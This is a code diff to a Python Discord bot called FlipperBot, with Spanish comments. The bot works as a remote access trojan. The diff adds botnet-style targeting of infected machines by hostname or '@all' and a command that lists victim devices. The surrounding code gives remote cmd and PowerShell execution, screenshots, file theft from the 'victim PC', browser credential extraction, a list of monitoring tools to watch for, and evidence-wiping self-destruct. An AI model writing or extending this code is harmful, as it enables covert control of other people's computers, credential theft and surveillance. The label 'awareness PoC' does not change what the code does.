@@ -20,10 +20,14 @@ import io
 import datetime
 import json
 import shutil
+import asyncio
+import socket
 
 intents = discord.Intents.default()
 intents.message_content = True
-bot = commands.Bot(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+
+MY_HOSTNAME = platform.node().lower()
 
 WATCHDOG_PROCESSES = [
     "taskmgr", "procmon", "procmon64", "procexp", "procexp64",
@@ -54,6 +58,36 @@ def channel_check(ctx):
     if ALLOWED_CHANNEL is None:
         return True
     return ctx.channel.id == ALLOWED_CHANNEL
+
+
+def parse_target(text):
+    """Extrae @hostname del inicio del texto. Retorna (target, resto)."""
+    if text and text.startswith("@"):
+        parts = text.split(None, 1)
+        target = parts[0][1:].lower()
+        rest = parts[1] if len(parts) > 1 else ""
+        return target, rest
+    return None, text
+
+
+def is_for_me(target):
+    """Verifica si este comando es para esta instancia."""
+    if target is None:
+        return False
+    if target == "all":
+        return True
+    return target == MY_HOSTNAME
+
+
+def _get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "N/A"
 
 
 @tasks.loop(seconds=30)
@@ -194,6 +228,7 @@ async def ayuda(ctx):
         description="Lista de comandos disponibles:",
         color=0x3498DB,
     )
+    embed.add_field(name="!bots", value="Lista dispositivos conectados", inline=False)
     embed.add_field(name="!ping", value="Verifica que el bot esta activo", inline=False)
     embed.add_field(name="!info", value="Informacion basica del sistema", inline=False)
     embed.add_field(name="!screenshot", value="Captura de pantalla", inline=False)
@@ -207,25 +242,66 @@ async def ayuda(ctx):
     embed.add_field(name="!uptime", value="Tiempo encendida de la PC", inline=False)
     embed.add_field(name="!exit", value="Apaga el bot", inline=False)
     embed.add_field(name="!selfdestruct", value="Elimina toda evidencia y apaga el bot", inline=False)
+    embed.add_field(
+        name="​\nTargeting (obligatorio)",
+        value=(
+            "Todos los comandos requieren `@hostname` o `@all`.\n"
+            "Sin `@`, el comando es **ignorado** por todos los agentes.\n"
+            "`!cmd @LAPTOP01 whoami` → solo en LAPTOP01\n"
+            "`!screenshot @all` → en todas las PCs\n"
+            "`!bots` → no requiere target (todos responden)"
+        ),
+        inline=False,
+    )
     await ctx.send(embed=embed)
 
 
 @bot.command()
-async def ping(ctx):
-    """Verifica que el bot esta activo"""
-    if not channel_check(ctx):
-        return
-    latency = round(bot.latency * 1000)
-    await ctx.send(f"Pong! Latencia: **{latency}ms**")
-
-
-@bot.command()
-async def info(ctx):
-    """Muestra informacion basica del sistema"""
+async def bots(ctx):
+    """Lista los dispositivos conectados — cada agente responde con su info"""
     if not channel_check(ctx):
         return
     mem = psutil.virtual_memory()
-    embed = discord.Embed(title="Informacion del Sistema", color=0x3498DB)
+    boot = datetime.datetime.fromtimestamp(psutil.boot_time())
+    delta = datetime.datetime.now() - boot
+    hours, remainder = divmod(int(delta.total_seconds()), 3600)
+    minutes, _ = divmod(remainder, 60)
+    embed = discord.Embed(
+        title=f"Agente: {MY_HOSTNAME.upper()}",
+        color=0x2ECC71,
+    )
+    embed.add_field(name="Usuario", value=f"`{os.getlogin()}`", inline=True)
+    embed.add_field(name="OS", value=f"`{platform.system()} {platform.release()}`", inline=True)
+    embed.add_field(name="RAM", value=f"`{mem.total // (1024**3)} GB ({mem.percent}%)`", inline=True)
+    embed.add_field(name="CPU", value=f"`{psutil.cpu_percent(interval=0.5)}%`", inline=True)
+    embed.add_field(name="Uptime", value=f"`{hours}h {minutes}m`", inline=True)
+    embed.add_field(name="IP Local", value=f"`{_get_local_ip()}`", inline=True)
+    embed.set_footer(text="Usa @" + MY_HOSTNAME + " para dirigir comandos a esta PC")
+    await ctx.send(embed=embed)
+
+
+@bot.command()
+async def ping(ctx, *, args: str = ""):
+    """Verifica que el bot esta activo"""
+    if not channel_check(ctx):
+        return
+    target, _ = parse_target(args)
+    if not is_for_me(target):
+        return
+    latency = round(bot.latency * 1000)
+    await ctx.send(f"**[{MY_HOSTNAME.upper()}]** Pong! Latencia: **{latency}ms**")
+
+
+@bot.command()
+async def info(ctx, *, args: str = ""):
+    """Muestra informacion basica del sistema"""
+    if not channel_check(ctx):
+        return
+    target, _ = parse_target(args)
+    if not is_for_me(target):
+        return
+    mem = psutil.virtual_memory()
+    embed = discord.Embed(title=f"Informacion del Sistema — {MY_HOSTNAME.upper()}", color=0x3498DB)
     embed.add_field(name="PC", value=platform.node(), inline=True)
     embed.add_field(name="Usuario", value=os.getlogin(), inline=True)
     embed.add_field(name="OS", value=platform.platform(), inline=False)
@@ -240,9 +316,12 @@ async def info(ctx):
 
 
 @bot.command()
-async def screenshot(ctx):
+async def screenshot(ctx, *, args: str = ""):
     """Toma una captura de pantalla"""
     if not channel_check(ctx):
+        return
+    target, _ = parse_target(args)
+    if not is_for_me(target):
         return
     try:
         from PIL import ImageGrab
@@ -251,8 +330,8 @@ async def screenshot(ctx):
         img.save(buf, format="PNG")
         buf.seek(0)
         await ctx.send(
-            content="Captura de pantalla:",
-            file=discord.File(buf, filename="screenshot.png"),
+            content=f"**[{MY_HOSTNAME.upper()}]** Captura de pantalla:",
+            file=discord.File(buf, filename=f"screenshot_{MY_HOSTNAME}.png"),
         )
     except Exception as e:
         await ctx.send(f"Error al tomar captura: {e}")
@@ -262,6 +341,12 @@ async def screenshot(ctx):
 async def say(ctx, *, mensaje: str):
     """Hace que la PC hable usando el sintetizador de voz de Windows"""
     if not channel_check(ctx):
+        return
+    target, mensaje = parse_target(mensaje)
+    if not is_for_me(target):
+        return
+    if not mensaje:
+        await ctx.send(f"**[{MY_HOSTNAME.upper()}]** Uso: `!say [@host] texto`")
         return
     safe_msg = mensaje.replace('"', "'").replace("`", "'")
     ps_cmd = (
@@ -273,13 +358,19 @@ async def say(ctx, *, mensaje: str):
         ["powershell", "-NoProfile", "-Command", ps_cmd],
         creationflags=subprocess.CREATE_NO_WINDOW,
     )
-    await ctx.send(f"Hablando: *{mensaje}*")
+    await ctx.send(f"**[{MY_HOSTNAME.upper()}]** Hablando: *{mensaje}*")
 
 
 @bot.command()
 async def notify(ctx, *, contenido: str):
     """Muestra una notificacion toast en Windows. Uso: !notify titulo | mensaje"""
     if not channel_check(ctx):
+        return
+    target, contenido = parse_target(contenido)
+    if not is_for_me(target):
+        return
+    if not contenido:
+        await ctx.send(f"**[{MY_HOSTNAME.upper()}]** Uso: `!notify [@host] titulo | mensaje`")
         return
     if "|" in contenido:
         titulo, mensaje = contenido.split("|", 1)
@@ -306,19 +397,22 @@ async def notify(ctx, *, contenido: str):
         ["powershell", "-NoProfile", "-Command", ps_cmd],
         creationflags=subprocess.CREATE_NO_WINDOW,
     )
-    await ctx.send(f"Notificacion enviada: **{titulo}** - {mensaje}")
+    await ctx.send(f"**[{MY_HOSTNAME.upper()}]** Notificacion enviada: **{titulo}** - {mensaje}")
 
 
 @bot.command()
-async def uptime(ctx):
+async def uptime(ctx, *, args: str = ""):
     """Muestra el tiempo que lleva encendida la PC"""
     if not channel_check(ctx):
+        return
+    target, _ = parse_target(args)
+    if not is_for_me(target):
         return
     boot = datetime.datetime.fromtimestamp(psutil.boot_time())
     delta = datetime.datetime.now() - boot
     hours, remainder = divmod(int(delta.total_seconds()), 3600)
     minutes, seconds = divmod(remainder, 60)
-    await ctx.send(f"Uptime: **{hours}h {minutes}m {seconds}s**")
+    await ctx.send(f"**[{MY_HOSTNAME.upper()}]** Uptime: **{hours}h {minutes}m {seconds}s**")
 
 
 async def _run_and_reply(ctx, args, shell_prefix=None):
@@ -350,7 +444,7 @@ async def _run_and_reply(ctx, args, shell_prefix=None):
         output = f"ERROR: {e}"
         exit_info = "[error]"
 
-    header = f"```\n> {args}\n{exit_info}\n```\n"
+    header = f"**[{MY_HOSTNAME.upper()}]**\n```\n> {args}\n{exit_info}\n```\n"
     if len(header) + len(output) + 8 <= 2000:
         await ctx.send(header + f"```\n{output}\n```")
     else:
@@ -363,6 +457,12 @@ async def cmd(ctx, *, comando: str):
     """Ejecuta un comando del sistema operativo (cmd.exe)"""
     if not channel_check(ctx):
         return
+    target, comando = parse_target(comando)
+    if not is_for_me(target):
+        return
+    if not comando:
+        await ctx.send(f"**[{MY_HOSTNAME.upper()}]** Uso: `!cmd [@host] comando`")
+        return
     await _run_and_reply(ctx, comando, shell_prefix="cmd /C ")
 
 
@@ -371,6 +471,12 @@ async def ps(ctx, *, comando: str):
     """Ejecuta un comando de PowerShell"""
     if not channel_check(ctx):
         return
+    target, comando = parse_target(comando)
+    if not is_for_me(target):
+        return
+    if not comando:
+        await ctx.send(f"**[{MY_HOSTNAME.upper()}]** Uso: `!ps [@host] comando`")
+        return
     await _run_and_reply(ctx, comando, shell_prefix="powershell -NoProfile -Command ")
 
 
@@ -378,6 +484,12 @@ async def ps(ctx, *, comando: str):
 async def download(ctx, *, ruta: str):
     """Descarga un archivo de la PC victima a Discord"""
     if not channel_check(ctx):
+        return
+    target, ruta = parse_target(ruta)
+    if not is_for_me(target):
+        return
+    if not ruta:
+        await ctx.send(f"**[{MY_HOSTNAME.upper()}]** Uso: `!download [@host] ruta`")
         return
     ruta = ruta.strip('"').strip("'")
     path = os.path.expandvars(os.path.expanduser(ruta))
@@ -408,6 +520,10 @@ async def upload(ctx, *, ruta: str = None):
     """Sube un archivo adjunto de Discord a la PC victima"""
     if not channel_check(ctx):
         return
+    if ruta:
+        target, ruta = parse_target(ruta)
+        if not is_for_me(target):
+            return
     if not ctx.message.attachments:
         await ctx.send("Adjunta un archivo al mensaje. Uso: `!upload C:\\ruta\\destino\\archivo.txt` + archivo adjunto")
         return
@@ -458,11 +574,14 @@ async def upload(ctx, *, ruta: str = None):
 
 
 @bot.command()
-async def creds(ctx):
+async def creds(ctx, *, args: str = ""):
     """Extrae credenciales guardadas en Chrome y Edge (PoC de concientizacion)"""
     if not channel_check(ctx):
         return
-    await ctx.send("Extrayendo credenciales guardadas...")
+    target, _ = parse_target(args)
+    if not is_for_me(target):
+        return
+    await ctx.send(f"**[{MY_HOSTNAME.upper()}]** Extrayendo credenciales guardadas...")
     try:
         credentials = extract_credentials()
     except Exception as e:
@@ -521,18 +640,24 @@ async def creds(ctx):
 
 
 @bot.command(name="exit")
-async def exit_bot(ctx):
+async def exit_bot(ctx, *, args: str = ""):
     """Apaga el bot"""
     if not channel_check(ctx):
         return
-    await ctx.send("FlipperBot desconectandose... Adios!")
+    target, _ = parse_target(args)
+    if not is_for_me(target):
+        return
+    await ctx.send(f"**[{MY_HOSTNAME.upper()}]** FlipperBot desconectandose... Adios!")
     await bot.close()
 
 
 @bot.command(name="selfdestruct")
-async def selfdestruct(ctx):
+async def selfdestruct(ctx, *, args: str = ""):
     """Elimina toda evidencia y apaga el bot"""
     if not channel_check(ctx):
+        return
+    target, _ = parse_target(args)
+    if not is_for_me(target):
         return
     embed = discord.Embed(
         title="Autodestruccion manual iniciada",
